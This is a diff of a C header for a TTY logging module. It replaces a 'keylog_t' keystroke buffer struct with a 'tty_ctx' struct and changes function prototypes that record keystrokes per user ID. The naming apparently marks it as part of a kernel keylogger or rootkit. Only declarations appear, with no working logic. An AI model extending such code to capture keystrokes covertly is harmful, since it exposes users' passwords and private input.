@@ -9,16 +9,16 @@ enum { //tty flags
     R_RANGE=4
 };
 
-struct keylog_t {
-    char buf[KEY_LOG_BUF_MAX+2]; /** newline+'\0' */
-    int offset;
-    uid_t uid;
-    struct list_head list;
+/**
+ * TTY user context
+ */
+struct tty_ctx{
+	struct file *fp;
+	struct list_head *head;
 };
 
-struct file *kv_tty_open(struct file **, const char *);
-void kv_tty_write(struct file *, uid_t, char *, ssize_t);
-int kv_key_add(struct list_head *, uid_t, char, int);
-int kv_key_update(struct list_head *, struct file*, uid_t, char, int);
-void kv_tty_close(struct list_head *);
+struct tty_ctx kv_tty_open(struct tty_ctx*,  const char *);
+void kv_tty_write(struct tty_ctx *, uid_t, char *, ssize_t);
+int kv_key_update(struct tty_ctx *, uid_t, char, int);
+void kv_tty_close(struct tty_ctx *);
 #endif //__TTY_H
